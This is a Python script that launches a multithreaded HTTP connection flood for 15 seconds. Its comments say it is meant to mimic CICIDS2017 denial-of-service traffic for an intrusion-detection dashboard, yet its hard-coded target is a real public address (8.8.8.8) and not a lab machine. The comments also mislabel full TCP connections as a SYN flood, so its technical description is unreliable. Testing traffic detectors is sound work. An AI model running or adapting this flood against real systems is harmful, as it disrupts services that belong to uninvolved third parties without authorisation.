import socket
import time
import threading

target_ip = "8.8.8.8" 
target_port = 80  # MUST be 80 (HTTP) to match the training data's DDoS signature
attack_duration = 15 # Run for 15 seconds

def simulate_http_flood():
    timeout = time.time() + attack_duration
    while time.time() < timeout:
        try:
            # Create a NEW socket every loop = New Source Port = New Flow
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            # This generates a TCP SYN packet to Port 80
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n" * 5)
            s.close()
        except Exception:
            # We expect timeouts since we are flooding
            pass

print("Initiating CICIDS2017-mimic TCP Port 80 SYN Flood...")
print("Watch your Streamlit Dashboard...")

# Spawn 20 concurrent attacker threads to overwhelm the sequence buffer
threads = []
for _ in range(20):
    t = threading.Thread(target=simulate_http_flood)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Attack simulation complete!")